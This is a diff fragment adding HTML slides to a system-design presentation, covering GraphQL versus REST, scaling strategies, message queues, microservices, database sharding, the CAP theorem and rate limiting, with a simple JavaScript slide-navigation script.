+        <div class="cyan-underline"></div>
+        <div class="slide-subtitle">Query Language for APIs</div>
+
+        <div class="comparison-row">
+          <div class="benefit-box" style="border-color: #e535ab; background: rgba(229, 53, 171, 0.2)">
+            <h3 style="color: #e535ab">GraphQL Advantages</h3>
+            <ul>
+              <li>Single endpoint</li>
+              <li>Client specifies data needed</li>
+              <li>No over-fetching</li>
+              <li>Strong typing with schema</li>
+            </ul>
+          </div>
+          <div class="benefit-box">
+            <h3>REST Advantages</h3>
+            <ul>
+              <li>Simple & well-understood</li>
+              <li>HTTP caching built-in</li>
+              <li>Stateless by design</li>
+              <li>Better for simple CRUD</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="info-box" style="text-align: left; font-family: monospace; font-size: 16px">
+          query {<br />
+          &nbsp;&nbsp;user(id: "123") {<br />
+          &nbsp;&nbsp;&nbsp;&nbsp;name<br />
+          &nbsp;&nbsp;&nbsp;&nbsp;email<br />
+          &nbsp;&nbsp;&nbsp;&nbsp;orders { id, total }<br />
+          &nbsp;&nbsp;}<br />
+          }
+        </div>
+
+        <div class="key-takeaway">
+          <h4>When to Use?</h4>
+          <p>REST for simple APIs • GraphQL for complex, nested data requirements</p>
+        </div>
+      </div>
+
+      <!-- Slide 16: REST vs GraphQL -->
+      <div class="slide">
+        <div class="slide-title">REST vs GraphQL</div>
+        <div class="cyan-underline"></div>
+
+        <div class="arch-flow">
+          <div class="arch-box cyan">
+            <div class="icon">📡</div>
+            <div class="label">REST</div>
+          </div>
+          <div class="arch-arrow" style="color: #64748b">vs</div>
+          <div class="arch-box" style="border-color: #e535ab">
+            <div class="icon">◈</div>
+            <div class="label">GraphQL</div>
+          </div>
+        </div>
+
+        <div class="checklist" style="max-width: 1000px">
+          <div class="check-item">
+            <div class="check-icon" style="background: #06b6d4">R</div>
+            <div class="check-text">
+              <h4>Multiple Endpoints <span class="underline"></span></h4>
+              <p>REST: /users, /posts, /comments → GraphQL: Single /graphql endpoint</p>
+            </div>
+          </div>
+          <div class="check-item">
+            <div class="check-icon" style="background: #e535ab">G</div>
+            <div class="check-text">
+              <h4>Data Fetching <span class="underline"></span></h4>
+              <p>REST: Multiple round trips → GraphQL: One request, exact data</p>
+            </div>
+          </div>
+          <div class="check-item">
+            <div class="check-icon" style="background: #06b6d4">R</div>
+            <div class="check-text">
+              <h4>Caching <span class="underline"></span></h4>
+              <p>REST: HTTP caching easy → GraphQL: Requires custom caching</p>
+            </div>
+          </div>
+          <div class="check-item">
+            <div class="check-icon" style="background: #e535ab">G</div>
+            <div class="check-text">
+              <h4>Versioning <span class="underline"></span></h4>
+              <p>REST: /v1/users, /v2/users → GraphQL: Evolve schema, deprecate fields</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Slide 17: Horizontal vs Vertical Scaling -->
+      <div class="slide">
+        <div class="slide-title">Scaling Strategies</div>
+        <div class="cyan-underline"></div>
+
+        <div class="comparison-row">
+          <div class="benefit-box" style="border-color: #10b981; background: rgba(16, 185, 129, 0.2)">
+            <h3 style="color: #34d399">⬆️ Vertical Scaling (Scale Up)</h3>
+            <ul>
+              <li>Add more CPU, RAM, Storage</li>
+              <li>Single machine upgrade</li>
+              <li>Simpler architecture</li>
+              <li>Hardware limits exist</li>
+            </ul>
+          </div>
+          <div class="benefit-box" style="border-color: #8b5cf6; background: rgba(139, 92, 246, 0.2)">
+            <h3 style="color: #a78bfa">↔️ Horizontal Scaling (Scale Out)</h3>
+            <ul>
+              <li>Add more machines/instances</li>
+              <li>Distributed system</li>
+              <li>Requires load balancer</li>
+              <li>Unlimited scalability</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="arch-flow">
+          <div style="text-align: center">
+            <div class="arch-box green" style="margin-bottom: 10px">
+              <div class="icon">🖥️</div>
+              <div class="label">Small</div>
+            </div>
+            <div class="arch-arrow" style="transform: rotate(90deg)">↓</div>
+            <div class="arch-box green" style="transform: scale(1.2)">
+              <div class="icon">🖥️</div>
+              <div class="label">Large</div>
+            </div>
+            <div style="color: #64748b; margin-top: 15px">Vertical</div>
+          </div>
+          <div style="width: 80px"></div>
+          <div style="text-align: center">
+            <div style="display: flex; gap: 10px">
+              <div class="arch-box purple">
+                <div class="icon">🖥️</div>
+              </div>
+              <div class="arch-box purple">
+                <div class="icon">🖥️</div>
+              </div>
+              <div class="arch-box purple">
+                <div class="icon">🖥️</div>
+              </div>
+            </div>
+            <div style="color: #64748b; margin-top: 15px">Horizontal</div>
+          </div>
+        </div>
+
+        <div class="key-takeaway">
+          <h4>Best Practice</h4>
+          <p>Start vertical (simpler) → Go horizontal when you hit limits</p>
+        </div>
+      </div>
+
+      <!-- Slide 18: Message Queues -->
+      <div class="slide">
+        <div class="slide-title">Message Queues</div>
+        <div class="cyan-underline"></div>
+        <div class="slide-subtitle">Asynchronous Communication</div>
+
+        <div class="arch-flow">
+          <div class="arch-box cyan">
+            <div class="icon">📤</div>
+            <div class="label">Producer</div>
+          </div>
+          <div class="arch-arrow">→</div>
+          <div class="arch-box orange">
+            <div class="icon">📬</div>
+            <div class="label">Queue</div>
+          </div>
+          <div class="arch-arrow">→</div>
+          <div class="arch-box purple">
+            <div class="icon">📥</div>
+            <div class="label">Consumer</div>
+          </div>
+        </div>
+
+        <div class="feature-grid">
+          <div class="feature-card">
+            <div class="icon">🐰</div>
+            <h4>RabbitMQ</h4>
+            <p>Traditional message broker</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">📊</div>
+            <h4>Apache Kafka</h4>
+            <p>Event streaming platform</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">☁️</div>
+            <h4>AWS SQS</h4>
+            <p>Managed queue service</p>
+          </div>
+        </div>
+
+        <div class="comparison-row">
+          <div class="benefit-box">
+            <h3>Benefits</h3>
+            <ul>
+              <li>Decoupled services</li>
+              <li>Handle traffic spikes</li>
+              <li>Retry failed operations</li>
+              <li>Async processing</li>
+            </ul>
+          </div>
+          <div class="benefit-box" style="border-color: #f59e0b; background: rgba(245, 158, 11, 0.2)">
+            <h3 style="color: #fbbf24">Use Cases</h3>
+            <ul>
+              <li>Email notifications</li>
+              <li>Order processing</li>
+              <li>Log aggregation</li>
+              <li>Data pipelines</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Slide 19: Microservices vs Monolith -->
+      <div class="slide">
+        <div class="slide-title">Monolith vs Microservices</div>
+        <div class="cyan-underline"></div>
+
+        <div class="comparison-row">
+          <div class="benefit-box" style="border-color: #f59e0b; background: rgba(245, 158, 11, 0.15)">
+            <h3 style="color: #fbbf24">🏢 Monolith</h3>
+            <ul>
+              <li>Single deployable unit</li>
+              <li>Shared database</li>
+              <li>Simple to develop initially</li>
+              <li>Harder to scale specific parts</li>
+            </ul>
+          </div>
+          <div class="benefit-box" style="border-color: #8b5cf6; background: rgba(139, 92, 246, 0.15)">
+            <h3 style="color: #a78bfa">🔷 Microservices</h3>
+            <ul>
+              <li>Independent services</li>
+              <li>Own database per service</li>
+              <li>Scale services independently</li>
+              <li>Complex infrastructure</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="arch-flow">
+          <div style="text-align: center">
+            <div class="arch-box orange" style="width: 200px; height: 150px">
+              <div class="icon">🏢</div>
+              <div class="label">Monolith<br /><small style="color: #94a3b8">All in one</small></div>
+            </div>
+          </div>
+          <div class="arch-arrow" style="font-size: 40px">→</div>
+          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px">
+            <div class="arch-box purple"><div class="label">Auth</div></div>
+            <div class="arch-box purple"><div class="label">Users</div></div>
+            <div class="arch-box purple"><div class="label">Orders</div></div>
+            <div class="arch-box purple"><div class="label">Payment</div></div>
+          </div>
+        </div>
+
+        <div class="key-takeaway">
+          <h4>Decision Guide</h4>
+          <p>Start Monolith → Extract to Microservices when complexity demands</p>
+        </div>
+      </div>
+
+      <!-- Slide 20: Database Replication & Sharding -->
+      <div class="slide">
+        <div class="slide-title">Database Scaling</div>
+        <div class="cyan-underline"></div>
+        <div class="slide-subtitle">Replication • Sharding • Partitioning</div>
+
+        <div class="comparison-row">
+          <div class="benefit-box" style="border-color: #10b981; background: rgba(16, 185, 129, 0.15)">
+            <h3 style="color: #34d399">📋 Replication</h3>
+            <ul>
+              <li>Copy data to multiple nodes</li>
+              <li>Master-Slave / Primary-Replica</li>
+              <li>Read scalability</li>
+              <li>High availability</li>
+            </ul>
+          </div>
+          <div class="benefit-box" style="border-color: #3b82f6; background: rgba(59, 130, 246, 0.15)">
+            <h3 style="color: #60a5fa">🔪 Sharding</h3>
+            <ul>
+              <li>Split data across nodes</li>
+              <li>Horizontal partitioning</li>
+              <li>Write scalability</li>
+              <li>Complex queries harder</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="arch-flow">
+          <div style="text-align: center">
+            <div class="arch-box green" style="margin-bottom: 10px">
+              <div class="icon">👑</div>
+              <div class="label">Primary</div>
+            </div>
+            <div style="display: flex; gap: 10px; margin-top: 10px">
+              <div class="arch-box cyan"><div class="label">Replica 1</div></div>
+              <div class="arch-box cyan"><div class="label">Replica 2</div></div>
+            </div>
+            <div style="color: #64748b; margin-top: 10px">Replication</div>
+          </div>
+          <div style="width: 60px"></div>
+          <div style="text-align: center">
+            <div style="display: flex; gap: 10px">
+              <div class="arch-box blue">
+                <div class="label">Shard A<br /><small>Users A-M</small></div>
+              </div>
+              <div class="arch-box blue">
+                <div class="label">Shard B<br /><small>Users N-Z</small></div>
+              </div>
+            </div>
+            <div style="color: #64748b; margin-top: 10px">Sharding</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Slide 21: CAP Theorem -->
+      <div class="slide">
+        <div class="slide-title">CAP Theorem</div>
+        <div class="cyan-underline"></div>
+        <div class="slide-subtitle">Pick Two of Three</div>
+
+        <div class="feature-grid">
+          <div class="feature-card" style="border-color: #06b6d4">
+            <div class="icon">🔄</div>
+            <h4>Consistency</h4>
+            <p>All nodes see same data at same time</p>
+          </div>
+          <div class="feature-card" style="border-color: #10b981">
+            <div class="icon">✅</div>
+            <h4>Availability</h4>
+            <p>System always responds to requests</p>
+          </div>
+          <div class="feature-card" style="border-color: #8b5cf6">
+            <div class="icon">🌐</div>
+            <h4>Partition Tolerance</h4>
+            <p>System works despite network failures</p>
+          </div>
+        </div>
+
+        <div class="comparison-row" style="margin-top: 30px">
+          <div class="benefit-box">
+            <h3>CP Systems</h3>
+            <ul>
+              <li>MongoDB, Redis, HBase</li>
+              <li>Consistency + Partition Tolerance</li>
+              <li>May reject requests during partition</li>
+            </ul>
+          </div>
+          <div class="benefit-box" style="border-color: #10b981; background: rgba(16, 185, 129, 0.15)">
+            <h3 style="color: #34d399">AP Systems</h3>
+            <ul>
+              <li>Cassandra, DynamoDB, CouchDB</li>
+              <li>Availability + Partition Tolerance</li>
+              <li>Eventually consistent</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Slide 22: Rate Limiting -->
+      <div class="slide">
+        <div class="slide-title">Rate Limiting</div>
+        <div class="cyan-underline"></div>
+        <div class="slide-subtitle">Protect Your APIs</div>
+
+        <div class="arch-flow">
+          <div class="arch-box cyan">
+            <div class="icon">👥</div>
+            <div class="label">Clients</div>
+          </div>
+          <div class="arch-arrow">→</div>
+          <div class="arch-box red">
+            <div class="icon">🚦</div>
+            <div class="label">Rate Limiter</div>
+          </div>
+          <div class="arch-arrow">→</div>
+          <div class="arch-box purple">
+            <div class="icon">🖥️</div>
+            <div class="label">API Server</div>
+          </div>
+        </div>
+
+        <div class="feature-grid">
+          <div class="feature-card">
+            <div class="icon">🪣</div>
+            <h4>Token Bucket</h4>
+            <p>Tokens added at fixed rate, consumed per request</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">🚰</div>
+            <h4>Leaky Bucket</h4>
+            <p>Requests processed at constant rate</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">🪟</div>
+            <h4>Sliding Window</h4>
+            <p>Count requests in rolling time window</p>
+          </div>
+        </div>
+
+        <div class="info-box">HTTP 429: Too Many Requests • X-RateLimit-Limit • X-RateLimit-Remaining</div>
+      </div>
+
+      <!-- Slide 23: Summary (Updated) -->
+      <div class="slide">
+        <div class="slide-title">System Design Summary</div>
+        <div class="cyan-underline"></div>
+
+        <div class="feature-grid">
+          <div class="feature-card">
+            <div class="icon">🔐</div>
+            <h4>Security First</h4>
+            <p>HTTPS, Auth, Input validation</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">⚡</div>
+            <h4>Performance</h4>
+            <p>Caching, CDN, Load Balancing</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">📈</div>
+            <h4>Scalability</h4>
+            <p>Horizontal scaling, DB sharding</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">🔄</div>
+            <h4>Reliability</h4>
+            <p>Redundancy, Failover, Backups</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">📊</div>
+            <h4>Monitoring</h4>
+            <p>Logs, Metrics, Alerts</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">🚀</div>
+            <h4>Deployment</h4>
+            <p>CI/CD, Blue-Green, Canary</p>
+          </div>
+        </div>
+
+        <div class="key-takeaway">
+          <h4>🎯 Key Takeaway</h4>
+          <p>Good system design balances trade-offs between performance, cost, and complexity</p>
+          <div class="subtext">Start simple, scale when needed, always plan for failure</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Slide Navigation Dots -->
+    <div class="slide-nav" id="slideNav"></div>
+
+    <script>
+      let currentSlide = 0;
+      const slides = document.querySelectorAll('.slide');
+      const total = slides.length;
+      const slideNav = document.getElementById('slideNav');
+
+      // Generate navigation dots dynamically
+      for (let i = 0; i < total; i++) {
+        const dot = document.createElement('div');
+        dot.className = 'slide-dot' + (i === 0 ? ' active' : '');
+        dot.onclick = () => goToSlide(i);
+        slideNav.appendChild(dot);
+      }
+
+      const dots = document.querySelectorAll('.slide-dot');
+      document.getElementById('total').textContent = total;
+
+      function showSlide(n) {
+        slides.forEach((s) => s.classList.remove('active'));
+        dots.forEach((d) => d.classList.remove('active'));
+
+        currentSlide = (n + total) % total;
+        slides[currentSlide].classList.add('active');
+        dots[currentSlide].classList.add('active');
+        document.getElementById('current').textContent = currentSlide + 1;
+      }
+
+      function nextSlide() {
+        showSlide(currentSlide + 1);
+      }
+      function prevSlide() {
+        showSlide(currentSlide - 1);
+      }
+      function goToSlide(n) {
+        showSlide(n);
+      }
+
+      // Keyboard navigation
+      document.addEventListener('keydown', (e) => {
+        if (e.key === 'ArrowRight' || e.key === ' ') nextSlide();
+        if (e.key === 'ArrowLeft') prevSlide();
+        if (e.key === 'f') toggleFullscreen();
+        if (e.key === 'Escape' && document.fullscreenElement) document.exitFullscreen();
+      });
+
+      function toggleFullscreen() {
+        if (!document.fullscreenElement) {
+          document.documentElement.requestFullscreen();
+        } else {
+          document.exitFullscreen();
+        }
+      }
+    </script>
+  </body>
+</html>
